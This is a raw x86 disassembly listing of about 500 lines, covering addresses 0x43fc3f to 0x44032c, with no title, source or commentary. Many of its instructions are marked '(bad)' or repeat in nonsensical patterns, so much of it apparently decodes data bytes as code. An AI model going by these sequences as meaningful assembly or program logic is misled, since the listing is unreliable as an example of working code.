  43fc3f:	push   DWORD PTR [ebp+0x3d]
  43fc42:	ret    
  43fc43:	cmp    eax,0xfffc9b75
  43fc48:	jne    0x43fbe5
  43fc4a:	cld    
  43fc4b:	push   DWORD PTR [ebp-0x65]
  43fc4e:	cld    
  43fc4f:	push   DWORD PTR [ebp+0x44]
  43fc52:	sar    DWORD PTR ds:0xfffc9b75,0x75
  43fc59:	fwait
  43fc5a:	cld    
  43fc5b:	push   DWORD PTR [ebp-0x65]
  43fc5e:	cld    
  43fc5f:	push   DWORD PTR [ebp-0x6f]
  43fc62:	ret    
  43fc63:	cmp    eax,0xfffc9975
  43fc68:	jne    0x43fc03
  43fc6a:	cld    
  43fc6b:	push   DWORD PTR [ebp-0x67]
  43fc6e:	cld    
  43fc6f:	push   DWORD PTR [ebp-0xd]
  43fc72:	ret    0x753d
  43fc75:	cdq    
  43fc76:	cld    
  43fc77:	inc    DWORD PTR [eax]
  43fc79:	add    BYTE PTR [eax],al
  43fc7b:	add    BYTE PTR [eax],al
  43fc7d:	jne    0x43fc18
  43fc7f:	cld    
  43fc80:	push   DWORD PTR [ebp-0x67]
  43fc83:	cld    
  43fc84:	push   DWORD PTR [ebp+0x5d]
  43fc87:	ret    0x753d
  43fc8a:	add    ah,bh
  43fc8c:	add    esi,DWORD PTR [ebp+0x2]
  43fc8f:	out    0x3,eax
  43fc91:	jne    0x43fc95
  43fc93:	out    0x3,eax
  43fc95:	jne    0x43fc99
  43fc97:	fdiv   QWORD PTR [ebx+0x3e70248]
  43fc9d:	jne    0x43fca1
  43fc9f:	out    0x3,eax
  43fca1:	jne    0x43fca5
  43fca3:	out    0x3,eax
  43fca5:	jne    0x43fca9
  43fca7:	push   ebp
  43fca8:	mov    ah,0xa8
  43fcaa:	add    ah,bh
  43fcac:	add    esi,DWORD PTR [ebp+0x2]
  43fcaf:	out    0x3,eax
  43fcb1:	jne    0x43fcb5
  43fcb3:	out    0x3,eax
  43fcb5:	jne    0x43fcb9
  43fcb7:	sub    dh,BYTE PTR [eax+ecx*4+0x7503e702]
  43fcbe:	add    ah,bh
  43fcc0:	add    esi,DWORD PTR [ebp+0x2]
  43fcc3:	out    0x3,eax
  43fcc5:	jne    0x43fcc9
  43fcc7:	mov    ebx,0xe70268b2
  43fccc:	add    esi,DWORD PTR [ebp+0x2]
  43fccf:	out    0x3,eax
  43fcd1:	jne    0x43fcd5
  43fcd3:	out    0x3,eax
  43fcd5:	jne    0x43fcd9
  43fcd7:	dec    ecx
  43fcd8:	mov    bl,0x48
  43fcda:	add    ah,bh
  43fcdc:	add    esi,DWORD PTR [ebp+0x2]
  43fcdf:	out    0x3,eax
  43fce1:	add    BYTE PTR [eax],al
  43fce3:	add    BYTE PTR [eax],al
  43fce5:	add    BYTE PTR [ebp+0x2],dh
  43fce8:	out    0x3,eax
  43fcea:	jne    0x43fcee
  43fcec:	shl    DWORD PTR [ebx],cl
  43fcee:	stos   DWORD PTR es:[edi],eax
  43fcef:	add    ah,bh
  43fcf1:	add    esi,DWORD PTR [ebp+0x2]
  43fcf4:	out    0x3,eax
  43fcf6:	jne    0x43fcfa
  43fcf8:	out    0x3,eax
  43fcfa:	jne    0x43fcfe
  43fcfc:	arpl   WORD PTR [ebx],si
  43fcfe:	mov    eax,DWORD PTR [edx]
  43fd00:	out    0x3,eax
  43fd02:	jne    0x43fd06
  43fd04:	out    0x3,eax
  43fd06:	jne    0x43fd0a
  43fd08:	add    cl,ch
  43fd0a:	jbe    0x43fd0e
  43fd0c:	add    BYTE PTR [ebp-0x17003b9a],ah
  43fd12:	jbe    0x43fd16
  43fd14:	add    cl,ch
  43fd16:	jbe    0x43fd1a
  43fd18:	add    cl,ch
  43fd1a:	jbe    0x43fd1e
  43fd1c:	add    dh,ch
  43fd1e:	inc    edi
  43fd1f:	(bad)  
  43fd20:	(bad)  
  43fd21:	call   0xe943ff9c
  43fd26:	jbe    0x43fd2a
  43fd28:	add    cl,ch
  43fd2a:	jbe    0x43fd2e
  43fd2c:	add    BYTE PTR [edi-0x17003b59],cl
  43fd32:	jbe    0x43fd36
  43fd34:	add    cl,ch
  43fd36:	jbe    0x43fd3a
  43fd38:	add    cl,ch
  43fd3a:	jbe    0x43fd3e
  43fd3c:	add    BYTE PTR [edi+eax*4-0x3c],ch
  43fd40:	(bad)  
  43fd41:	call   0xe943ffbc
  43fd46:	jbe    0x43fd4a
  43fd48:	add    cl,ch
  43fd4a:	add    BYTE PTR [eax],al
  43fd4c:	add    BYTE PTR [eax],al
  43fd4e:	add    BYTE PTR [esi+0x2],dh
  43fd51:	add    BYTE PTR [edi+eiz*2],cl
  43fd54:	(bad)  
  43fd55:	(bad)  
  43fd56:	call   0xe943ffd1
  43fd5b:	jbe    0x43fd5f
  43fd5d:	add    cl,ch
  43fd5f:	jbe    0x43fd63
  43fd61:	add    BYTE PTR [ecx+0x43],bl
  43fd64:	(bad)  
  43fd65:	(bad)  
  43fd66:	call   0xe943ffe1
  43fd6b:	jbe    0x43fd6f
  43fd6d:	add    cl,ch
  43fd6f:	jbe    0x43fd73
  43fd71:	add    BYTE PTR [edx+0x52],ch
  43fd74:	inc    eax
  43fd75:	add    cl,ch
  43fd77:	jbe    0x43fd7b
  43fd79:	add    cl,ch
  43fd7b:	jbe    0x43fd7f
  43fd7d:	add    cl,ch
  43fd7f:	jbe    0x43fd83
  43fd81:	add    BYTE PTR [edx+edx*2+0x40],dl
  43fd85:	add    BYTE PTR [eax],al
  43fd87:	dec    esp
  43fd88:	push   es
  43fd89:	add    BYTE PTR [eax],al
  43fd8b:	dec    esp
  43fd8c:	push   es
  43fd8d:	add    BYTE PTR [eax],al
  43fd8f:	sbb    al,0x6
  43fd91:	add    BYTE PTR [eax],al
  43fd93:	cwde   
  43fd94:	imul   edi,DWORD PTR [edx],0x60c00
  43fd9a:	add    BYTE PTR [esi+eax*1],cl
  43fd9d:	add    BYTE PTR [eax],al
  43fd9f:	sbb    al,0x6
  43fda1:	add    BYTE PTR [eax],al
  43fda3:	gs push 0x3a
  43fda6:	add    BYTE PTR [esi+eax*1],cl
  43fda9:	add    BYTE PTR [eax],al
  43fdab:	or     al,0x6
  43fdad:	add    BYTE PTR [eax],al
  43fdaf:	fadd   QWORD PTR ds:0x0
  43fdb5:	add    BYTE PTR [eax],al
  43fdb7:	add    BYTE PTR [edi+0x6a],cl
  43fdba:	cmp    al,BYTE PTR [eax]
  43fdbc:	int3   
  43fdbd:	add    eax,0x5cc0000
  43fdc2:	add    BYTE PTR [eax],al
  43fdc4:	fadd   QWORD PTR ds:0x6a7f0000
  43fdca:	cmp    al,BYTE PTR [eax]
  43fdcc:	int3   
  43fdcd:	add    eax,0x5cc0000
  43fdd2:	add    BYTE PTR [eax],al
  43fdd4:	pushf  
  43fdd5:	add    eax,0x6b1e0000
  43fdda:	cmp    al,BYTE PTR [eax]
  43fddc:	mov    WORD PTR ds:0x58c0000,es
  43fde2:	add    BYTE PTR [eax],al
  43fde4:	pushf  
  43fde5:	add    eax,0x6af60000
  43fdea:	cmp    al,BYTE PTR [eax]
  43fdec:	mov    WORD PTR ds:0x58c0000,es
  43fdf2:	add    BYTE PTR [eax],al
  43fdf4:	pop    esp
  43fdf5:	add    eax,0x6a0e0000
  43fdfa:	cmp    al,BYTE PTR [eax]
  43fdfc:	dec    esp
  43fdfd:	add    eax,0x54c0000
  43fe02:	add    BYTE PTR [eax],al
  43fe04:	jne    0x43fe71
  43fe06:	cld    
  43fe07:	push   DWORD PTR [ebp-0x72]
  43fe0a:	out    0x3d,eax
  43fe0c:	jne    0x43fe79
  43fe0e:	cld    
  43fe0f:	push   DWORD PTR [ebp+0x6b]
  43fe12:	cld    
  43fe13:	push   DWORD PTR [ebp+0x6b]
  43fe16:	cld    
  43fe17:	push   DWORD PTR [ebp-0x17]
  43fe1a:	inc    eax
  43fe1b:	add    BYTE PTR ds:[eax],al
  43fe1e:	add    BYTE PTR [eax],al
  43fe20:	add    BYTE PTR [ebp+0x6b],dh
  43fe23:	cld    
  43fe24:	push   DWORD PTR [ebp+0x6b]
  43fe27:	cld    
  43fe28:	push   DWORD PTR [ebp+0x6b]
  43fe2b:	cld    
  43fe2c:	push   DWORD PTR [ebp+0x40]
  43fe2f:	dec    eax
  43fe30:	ds jne 0x43fe9e
  43fe33:	cld    
  43fe34:	push   DWORD PTR [ebp+0x6b]
  43fe37:	cld    
  43fe38:	push   DWORD PTR [ebp+0x6b]
  43fe3b:	cld    
  43fe3c:	push   DWORD PTR [ebp-0x59]
  43fe3f:	dec    edi
  43fe40:	aas    
  43fe41:	jne    0x43feae
  43fe43:	cld    
  43fe44:	push   DWORD PTR [ebp+0x6b]
  43fe47:	cld    
  43fe48:	push   DWORD PTR [ebp+0x6b]
  43fe4b:	cld    
  43fe4c:	push   DWORD PTR [ebp-0x21]
  43fe4f:	xchg   edi,eax
  43fe50:	ds jne 0x43febe
  43fe53:	cld    
  43fe54:	push   DWORD PTR [ebp+0x6b]
  43fe57:	cld    
  43fe58:	push   DWORD PTR [ebp+0x6b]
  43fe5b:	cld    
  43fe5c:	push   DWORD PTR [ebp+0x20]
  43fe5f:	cwde   
  43fe60:	ds jne 0x43fece
  43fe63:	cld    
  43fe64:	push   DWORD PTR [ebp+0x6b]
  43fe67:	cld    
  43fe68:	push   DWORD PTR [ebp+0x6b]
  43fe6b:	cld    
  43fe6c:	push   DWORD PTR [ebp+0x70]
  43fe6f:	add    BYTE PTR [esi],bh
  43fe71:	jne    0x43fede
  43fe73:	cld    
  43fe74:	push   DWORD PTR [ebp+0x6b]
  43fe77:	cld    
  43fe78:	push   DWORD PTR [ebp+0x69]
  43fe7b:	cld    
  43fe7c:	push   DWORD PTR [ebp+0x4b]
  43fe7f:	mov    bh,BYTE PTR [esi]
  43fe81:	jne    0x43fe85
  43fe83:	out    0x3,eax
  43fe85:	add    BYTE PTR [eax],al
  43fe87:	add    BYTE PTR [eax],al
  43fe89:	add    BYTE PTR [ebp+0x2],dh
  43fe8c:	out    0x3,eax
  43fe8e:	jne    0x43fe92
  43fe90:	out    0x3,eax
  43fe92:	jne    0x43fe96
  43fe94:	lahf   
  43fe95:	add    al,0x83
  43fe97:	add    ah,bh
  43fe99:	add    esi,DWORD PTR [ebp+0x2]
  43fe9c:	out    0x3,eax
  43fe9e:	jne    0x43fea2
  43fea0:	fwait
  43fea1:	jmp    0x260:0xea8e0268
  43fea8:	adc    ecx,DWORD PTR [esi*4-0x4ae718fe]
  43feaf:	add    cl,BYTE PTR [ebx]
  43feb1:	or     al,0xb5
  43feb3:	add    cl,BYTE PTR [edi+0x1a]
  43feb6:	mov    ch,0x2
  43feb8:	pop    es
  43feb9:	or     al,0xb5
  43febb:	add    bl,bh
  43febd:	or     esi,DWORD PTR ds:0x350bd702
  43fec3:	add    bl,bh
  43fec5:	or     esi,DWORD PTR ds:0x350be702
  43fecb:	add    bl,BYTE PTR [edi]
  43fecd:	sbb    DWORD PTR ds:0x35191702,esi
  43fed3:	add    bh,bh
  43fed5:	sbb    BYTE PTR ds:0x35192302,dh
  43fedb:	add    dl,BYTE PTR [edi]
  43fedd:	sbb    DWORD PTR ds:0x35191f02,esi
  43fee3:	add    ah,BYTE PTR [edi]
  43fee5:	sbb    DWORD PTR ds:0x35189f02,esi
  43feeb:	add    cl,BYTE PTR [ebx+0x18]
  43fef1:	add    BYTE PTR [eax],al
  43fef3:	xor    eax,0x35188702
  43fef8:	add    ch,BYTE PTR [edi+0x18]
  43fefb:	xor    eax,0x35187302
  43ff00:	add    ah,BYTE PTR [ebx+0x18]
  43ff03:	mov    ch,0x2
  43ff05:	add    BYTE PTR [ecx],dh
  43ff07:	mov    edx,es
  43ff09:	(bad)  
  43ff0a:	cmp    al,0x7c
  43ff0c:	ret    0xcff
  43ff0f:	jl     0x43fed3
  43ff11:	(bad)  
  43ff12:	cmp    al,0x6c
  43ff14:	ret    0xe8ff
  43ff17:	jbe    0x43ff1b
  43ff19:	add    BYTE PTR [esi-0x1a68f85a],ch
  43ff1f:	hlt    
  43ff20:	ds add cl,ch
  43ff23:	jbe    0x43ff27
  43ff25:	add    cl,ch
  43ff27:	jbe    0x43ff2b
  43ff29:	add    cl,ch
  43ff2b:	jbe    0x43ff2f
  43ff2d:	add    cl,ch
  43ff2f:	jbe    0x43ff33
  43ff31:	add    cl,ch
  43ff33:	jbe    0x43ff37
  43ff35:	add    cl,ch
  43ff37:	jbe    0x43ff3b
  43ff39:	add    cl,ch
  43ff3b:	jbe    0x43ff3f
  43ff3d:	add    cl,ch
  43ff3f:	jbe    0x43ff43
  43ff41:	add    cl,ch
  43ff43:	jbe    0x43ff47
  43ff45:	add    cl,ch
  43ff47:	jbe    0x43ff4b
  43ff49:	add    cl,ch
  43ff4b:	jbe    0x43ff4f
  43ff4d:	add    cl,ch
  43ff4f:	jbe    0x43ff53
  43ff51:	add    cl,ch
  43ff53:	jbe    0x43ff57
  43ff55:	add    cl,ch
  43ff57:	add    BYTE PTR [eax],al
  43ff59:	add    BYTE PTR [eax],al
  43ff5b:	add    dh,al
  43ff5d:	jle    0x43ff57
  43ff5f:	in     eax,dx
  43ff60:	jbe    0x43ff64
  43ff62:	add    BYTE PTR [ecx-0x51],dh
  43ff65:	xchg   edx,eax
  43ff66:	ss dec ecx
  43ff68:	mov    edi,0xbf3136aa
  43ff6d:	inc    edx
  43ff6e:	sbb    DWORD PTR ss:[edi-0x572ec9a6],ebp
  43ff75:	jb     0x43ffad
  43ff77:	jmp    0xfd4401b2
  43ff7c:	jbe    0x43ff80
  43ff7e:	add    ch,dh
  43ff80:	mov    al,0x16
  43ff82:	cmp    al,BYTE PTR [eax]
  43ff84:	adc    BYTE PTR [edi-0x68],cl
  43ff87:	aas    
  43ff88:	add    al,0x4e
  43ff8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ff8b:	aas    
  43ff8c:	pop    esp
  43ff8d:	xor    al,BYTE PTR [eax]
  43ff8f:	add    BYTE PTR [eax+0x28000006],bl
  43ff95:	push   edx
  43ff96:	and    BYTE PTR [eax],dh
  43ff98:	sub    BYTE PTR [edx+0x38],dl
  43ff9b:	xor    BYTE PTR [eax+0x78305056],dl
  43ffa1:	push   esi
  43ffa2:	ins    BYTE PTR es:[edi],dx
  43ffa3:	xor    BYTE PTR [eax+0x56],dh
  43ffa6:	jl     0x43ffd8
  43ffa8:	mov    al,ds:0xc0308c56
  43ffad:	push   esi
  43ffae:	pushf  
  43ffaf:	xor    BYTE PTR [eax+0x56],ah
  43ffb2:	lods   al,BYTE PTR ds:[esi]
  43ffb3:	xor    al,dl
  43ffb5:	push   esi
  43ffb6:	mov    esp,0xcc566030
  43ffbb:	xor    BYTE PTR [eax+0x56],al
  43ffbe:	fdiv   QWORD PTR [eax]
  43ffc0:	add    BYTE PTR [eax],al
  43ffc2:	add    BYTE PTR [eax],al
  43ffc4:	add    BYTE PTR [eax+0x56],al
  43ffc7:	in     al,dx
  43ffc8:	xor    BYTE PTR [eax-0x1fcf03aa],dh
  43ffce:	push   esi
  43ffcf:	or     al,0x31
  43ffd1:	rcl    BYTE PTR [esi-0x8],0xff
  43ffd5:	int3   
  43ffd6:	and    DWORD PTR [eax],eax
  43ffd8:	add    BYTE PTR [edi+eax*1+0x0],ah
  43ffdc:	add    al,bl
  43ffde:	push   ecx
  43ffdf:	add    al,0x30
  43ffe1:	enter  0x1451,0x30
  43ffe5:	mov    eax,0xf8302451
  43ffea:	push   ecx
  43ffeb:	xor    al,0x30
  43ffed:	fcom   DWORD PTR [ecx+0x44]
  43fff0:	xor    BYTE PTR [eax],cl
  43fff2:	push   edx
  43fff3:	push   esp
  43fff4:	xor    al,bh
  43fff6:	push   ecx
  43fff7:	xor    BYTE PTR fs:[eax],bh
  43fffa:	push   esi
  43fffb:	je     0x44002d
  43fffd:	sbb    BYTE PTR [ecx-0x7c],dl
  440000:	xor    BYTE PTR [ebp-0x1],dh
  440003:	int3   
  440004:	fwait
  440005:	inc    ebp
  440006:	xchg   esp,ecx
  440008:	stos   DWORD PTR es:[edi],eax
  440009:	inc    ebp
  44000a:	dec    esp
  44000c:	mov    ebx,0xcbcca7a5
  440011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440012:	lahf   
  440013:	int3   
  440014:	(bad)  [ebp-0x5a1433b9]
  44001a:	lahf   
  44001b:	int3   
  44001c:	sti    
  44001d:	test   DWORD PTR [edi-0x2d],esp
  440020:	or     eax,DWORD PTR [edi+edi*2+0x47841bd3]
  440027:	shr    DWORD PTR [ebx],cl
  440029:	add    BYTE PTR [eax],al
  44002b:	add    BYTE PTR [eax],al
  44002d:	add    BYTE PTR [edi+edi*4+0x27643bd3],al
  440034:	ror    DWORD PTR [ebx+0x64],cl
  440037:	pop    ds
  440038:	rcr    DWORD PTR [ebx+0x64],cl
  44003b:	pop    es
  44003c:	shr    DWORD PTR [ebx+0x64],cl
  44003f:	pop    edi
  440040:	sar    DWORD PTR [ebx+0x44],cl
  440043:	out    0xd3,eax
  440045:	mov    eax,DWORD PTR [edi+edi*8-0x2d]
  440049:	fwait
  44004a:	inc    esp
  44004b:	xchg   ebx,edx
  44004d:	stos   DWORD PTR es:[edi],eax
  44004e:	inc    esp
  44004f:	call   ebx
  440051:	mov    ebx,0xcbd427a4
  440056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440057:	pop    ds
  440058:	aam    0xdb
  44005a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44005b:	(bad)  
  44005c:	shr    ebx,cl
  44005e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44005f:	pop    ds
  440060:	aam    0xfb
  440062:	test   BYTE PTR [edi-0x32],ah
  440065:	or     eax,DWORD PTR [edi-0x78e43181]
  44006b:	inc    edi
  44006c:	into   
  44006d:	sub    eax,DWORD PTR [edi+0x673bcebf]
  440073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440074:	into   
  440075:	dec    ebx
  440076:	addr16 lahf 
  440078:	into   
  440079:	pop    ebx
  44007a:	addr16 xchg esi,ecx
  44007d:	imul   esp,DWORD PTR [edi+0x2],0x5b
  440081:	ror    BYTE PTR [esi],cl
  440083:	xor    BYTE PTR [ebx-0x2e],ah
  440086:	(bad)  
  440087:	das    
  440088:	jnp    0x44005c
  44008a:	fisubr WORD PTR [edi]
  44008c:	adc    edx,0xffffffce
  44008f:	das    
  440090:	jnp    0x440064
  440092:	add    BYTE PTR [eax],al
  440094:	add    BYTE PTR [eax],al
  440096:	add    BYTE PTR [esi],ch
  440098:	xor    DWORD PTR [ebx-0x64cec12e],esp
  44009e:	sar    BYTE PTR [esi],cl
  4400a0:	xor    ebx,eax
  4400a2:	ror    BYTE PTR [esi+0x31],cl
  4400a5:	fwait
  4400a6:	ror    BYTE PTR [esi+0x31],cl
  4400a9:	jecxz  0x44007b
  4400ab:	jle    0x4400dc
  4400ad:	sti    
  4400ae:	rcr    BYTE PTR [esi+0x2f],1
  4400b1:	ret    
  4400b2:	ror    BYTE PTR [esi+0x6ed0bb2f],1
  4400b8:	das    
  4400b9:	and    edx,ecx
  4400bb:	mov    esi,0xbed11b2f
  4400c0:	das    
  4400c1:	add    edx,ecx
  4400c3:	mov    gs,WORD PTR [edi]
  4400c5:	fcmovnbe st,st(0)
  4400c7:	mov    gs,WORD PTR [edi]
  4400c9:	arpl   cx,dx
  4400cb:	(bad)  
  4400cc:	das    
  4400cd:	jnp    0x4400a0
  4400cf:	fisubr WORD PTR [edi]
  4400d1:	adc    ecx,0xffffffce
  4400d4:	das    
  4400d5:	jnp    0x4400a8
  4400d7:	xor    BYTE PTR cs:[ebx],ah
  4400da:	sar    DWORD PTR [esi-0x412ee4d1],1
  4400e0:	das    
  4400e1:	inc    ebx
  4400e2:	ror    esi,1
  4400e4:	das    
  4400e5:	sbb    edx,ecx
  4400e7:	into   
  4400e8:	das    
  4400e9:	jecxz  0x4400c2
  4400eb:	jle    0x440123
  4400ed:	sti    
  4400ee:	xlat   BYTE PTR ds:[ebx]
  4400ef:	pop    esi
  4400f0:	ss ret 
  4400f2:	xlat   BYTE PTR ds:[ebx]
  4400f3:	mov    ?,WORD PTR [esi]
  4400f5:	mov    ebx,0xa3366ed7
  4400fa:	xlat   BYTE PTR ds:[ebx]
  4400fb:	add    BYTE PTR [eax],al
  4400fd:	add    BYTE PTR [eax],al
  4400ff:	add    BYTE PTR [esi],bh
  440101:	add    BYTE PTR ss:[ebp-0x7acc2836],bl
  440108:	ret    0x33e7
  44010b:	pop    ebp
  44010c:	lods   eax,DWORD PTR ds:[esi]
  44010d:	div    DWORD PTR [ebx]
  44010f:	mov    gs:0xaa7d3387,al
  440115:	xchg   edi,eax
  440116:	xor    eax,DWORD PTR [ebp+0x7d33a7a2]
  44011c:	dec    edx
  44011d:	mov    bh,0x33
  44011f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440120:	inc    edx
  440121:	inc    edi
  440122:	xor    ebx,DWORD PTR [ebp-0x3acca8b6]
  440128:	inc    edx
  440129:	xor    ebx,DWORD PTR [di+0x772a]
  44012e:	xor    esp,ebp
  440130:	and    eax,DWORD PTR [edi]
  440132:	xor    edi,ebp
  440134:	sub    edx,DWORD PTR [edi]
  440136:	xor    eax,ebp
  440138:	and    esp,DWORD PTR [edi]
  44013a:	xor    edi,DWORD PTR [ebp+0x2533374b]
  440140:	inc    edx
  440141:	(bad)  
  440142:	xor    bl,BYTE PTR ds:0x532d74a
  440148:	inc    edx
  440149:	out    0x32,eax
  44014b:	(bad)  [ebx]
  44014d:	div    DWORD PTR [edx]
  44014f:	and    eax,DWORD PTR gs:[edi-0x68d482ce]
  440156:	xor    al,BYTE PTR [ebp+0x7d32a723]
  44015c:	retf   
  44015d:	mov    dh,0x32
  44015f:	and    eax,0x1d3246c3
  440164:	add    BYTE PTR [eax],al
  440166:	add    BYTE PTR [eax],al
  440168:	add    bl,cl
  44016a:	push   esi
  44016b:	xor    al,BYTE PTR [ebp-0x3d]
  44016e:	data16 xor bl,BYTE PTR ds:0xe93276ab
  440175:	data16 add al,BYTE PTR [eax]
  440178:	xor    DWORD PTR [esi+0x2],0x9ea54900
  44017f:	sub    al,0x0
  440181:	inc    esp
  440182:	push   edx
  440183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440184:	xor    ebp,DWORD PTR [edx+edx*2-0x54]
  440188:	xor    esp,DWORD PTR [edx+edx*2-0x4c]
  44018c:	xor    ecx,DWORD PTR [edx+edx*2-0x44]
  440190:	xor    eax,esp
  440192:	push   edx
  440193:	les    esi,FWORD PTR [ebx]
  440195:	push   0x50343852
  44019a:	push   edx
  44019b:	les    esi,FWORD PTR ds:0x35cc50bc
  4401a1:	ins    BYTE PTR es:[edi],dx
  4401a2:	push   esp
  4401a3:	sub    al,0x36
  4401a5:	je     0x4401fb
  4401a7:	xor    al,0x36
  4401a9:	in     al,dx
  4401aa:	push   esp
  4401ab:	pushf  
  4401ac:	ss hlt 
  4401ae:	push   esp
  4401af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4401b0:	lods   al,BYTE PTR ss:[esi]
  4401b2:	push   esp
  4401b3:	lods   al,BYTE PTR ds:[esi]
  4401b4:	ss aam 0x54
  4401b7:	mov    ah,0x36
  4401b9:	or     al,0x55
  4401bb:	mov    esp,0x50558036
  4401c0:	aaa    
  4401c1:	cwde   
  4401c2:	inc    esi
  4401c3:	cwde   
  4401c4:	cmp    BYTE PTR [eax+0x1038f846],dh
  4401ca:	inc    edi
  4401cb:	add    BYTE PTR [ecx],bh
  4401cd:	add    BYTE PTR [eax],al
  4401cf:	add    BYTE PTR [eax],al
  4401d1:	add    BYTE PTR [eax],bh
  4401d3:	inc    edi
  4401d4:	or     BYTE PTR [ecx],bh
  4401d6:	adc    BYTE PTR [edi+0x10],al
  4401d9:	cmp    DWORD PTR [eax],ecx
  4401db:	inc    edi
  4401dc:	sbb    BYTE PTR [ecx],bh
  4401de:	jo     0x440227
  4401e0:	and    BYTE PTR [ecx],bh
  4401e2:	or     al,0x86
  4401e4:	clc    
  4401e5:	call   DWORD PTR [esi+edi*8-0x1]
  4401e9:	inc    DWORD PTR [ecx+ecx*2]
  4401ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4401ed:	cmp    bl,BYTE PTR [eax+ecx*2-0x54]
  4401f1:	cmp    ah,BYTE PTR [eax+ecx*2-0x4c]
  4401f5:	cmp    bl,BYTE PTR [eax+ecx*2+0x48843abc]
  4401fc:	les    edi,FWORD PTR [edx]
  4401fe:	jne    0x44023b
  440200:	retf   0x7fd3
  440203:	xor    ecx,edx
  440205:	fld    TBYTE PTR [edi+0xb]
  440208:	retf   0x6fe3
  44020b:	adc    ecx,edx
  44020d:	jmp    0x44026e
  44020f:	jnp    0x4401db
  440211:	repz pop edi
  440213:	jae    0x4401df
  440215:	sti    
  440216:	dec    edi
  440217:	outs   dx,DWORD PTR ds:[esi]
  440218:	leave  
  440219:	cmovle ebp,DWORD PTR [edi-0x37]
  44021d:	pop    ss
  44021e:	outs   dx,DWORD PTR ds:[esi]
  440220:	leave  
  440221:	pop    ds
  440222:	ds dec eax
  440225:	daa    
  440226:	scas   al,BYTE PTR es:[edi]
  440227:	bswap  ecx
  440229:	das    
  44022a:	scas   al,BYTE PTR es:[edi]
  44022b:	outs   dx,DWORD PTR ds:[esi]
  44022c:	leave  
  44022d:	aaa    
  44022e:	sahf   
  44022f:	outs   dx,DWORD PTR ds:[esi]
  440230:	leave  
  440231:	aas    
  440232:	sahf   
  440233:	pop    ds
  440234:	leave  
  440235:	inc    edi
  440236:	add    BYTE PTR [eax],al
  440238:	add    BYTE PTR [eax],al
  44023a:	add    BYTE PTR [esi-0x71583639],cl
  440240:	(bad)  
  440241:	leave  
  440242:	scas   eax,DWORD PTR es:[edi]
  440243:	jle    0x4401c8
  440245:	leave  
  440246:	pop    edi
  440247:	jns    0x440248
  440249:	(bad)  
  44024a:	addr16 jno 0x44025c
  44024d:	enter  0x697f,0xf3
  440251:	ror    BYTE PTR [ebx-0x6c3f249f],0x59
  440258:	rol    eax,cl
  44025a:	fwait
  44025b:	push   ecx
  44025c:	xchg   eax,eax
  44025e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44025f:	dec    ecx
  440260:	xchg   eax,eax
  440262:	scas   eax,DWORD PTR es:[edi]
  440263:	inc    ecx
  440264:	xchg   edi,eax
  440265:	shl    BYTE PTR [edi-0x403f78c7],0xb1
  44026c:	daa    
  44026d:	rol    edi,0xa9
  440270:	daa    
  440271:	ror    edi,0xa1
  440274:	mov    edi,0xbb986bc0
  440279:	(bad)  
  44027a:	imul   edx,DWORD PTR [ebx-0x353668fe],0x78
  440281:	out    0x73,al
  440283:	ret    0xaa78
  440286:	add    esi,DWORD PTR [ebp+0x2]
  440289:	rcl    ebx,cl
  44028b:	cmp    BYTE PTR [edx],dh
  44028d:	inc    esp
  44028e:	aad    0x36
  440290:	cs test eax,0x352e40cf
  440296:	iret   
  440297:	mov    edx,0xc8d0ba2d
  44029c:	das    
  44029d:	mov    edi,0xd2
  4402a2:	add    BYTE PTR [eax],al
  4402a4:	jbe    0x4402d7
  4402a6:	arpl   sp,cx
  4402a8:	or     DWORD PTR [esi],esi
  4402aa:	xchg   esp,eax
  4402ab:	enter  0x3598,0xd2
  4402af:	enter  0x358a,0x5
  4402b3:	(bad)  
  4402b4:	scas   eax,DWORD PTR es:[edi]
  4402b5:	xor    eax,0x35c6c726
  4402ba:	adc    al,bh
  4402bc:	loopne 0x4402f5
  4402be:	fs leave 
  4402c0:	lock aaa 
  4402c2:	push   esi
  4402c3:	leave  
  4402c4:	or     bh,BYTE PTR [eax]
  4402c6:	mov    ebx,0xe73845c9
  4402cb:	arpl   WORD PTR [edx],di
  4402cd:	js     0x440345
  4402cf:	add    al,0x75
  4402d1:	add    ch,bl
  4402d3:	sar    DWORD PTR [ecx+0x32],cl
  4402d6:	int    0xd3
  4402d8:	push   edx
  4402d9:	xor    ch,BYTE PTR [ecx]
  4402db:	aam    0x94
  4402dd:	xor    ah,BYTE PTR [esi-0x2c]
  4402e0:	aad    0x32
  4402e2:	sub    edx,esp
  4402e4:	add    DWORD PTR [ebx],esi
  4402e6:	aad    0xd2
  4402e8:	mov    eax,ds:0xe4d4d933
  4402ed:	xor    edi,DWORD PTR [edx-0x2b]
  4402f0:	(bad)  
  4402f1:	xor    esi,DWORD PTR [ebp-0x30]
  4402f4:	and    ch,BYTE PTR [edi]
  4402f6:	inc    esp
  4402f7:	ror    ah,1
  4402f9:	add    BYTE PTR cs:[esi],cl
  4402fc:	stos   BYTE PTR es:[edi],al
  4402fd:	loope  0x440331
  4402ff:	outs   dx,BYTE PTR ds:[esi]
  440300:	ret    0x3242
  440303:	cmp    bh,BYTE PTR [edx+0x913263]
  440309:	add    BYTE PTR [eax],al
  44030b:	add    BYTE PTR [eax],al
  44030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44030e:	in     eax,0x31
  440310:	xchg   ecx,eax
  440311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440312:	div    BYTE PTR [ecx]
  440314:	jne    0x4402dd
  440316:	lea    esi,[ecx]
  440318:	dec    ebx
  440319:	(bad)  
  44031a:	lahf   
  44031b:	xor    DWORD PTR [ebx-0x39],eax
  44031e:	inc    esp
  44031f:	xor    DWORD PTR [edi],ebx
  440321:	(bad)  
  440322:	pop    ebx
  440323:	xor    DWORD PTR ds:0xe5315da7,eax
  440329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44032a:	adc    BYTE PTR [ecx],dh
  44032c:	push   ss
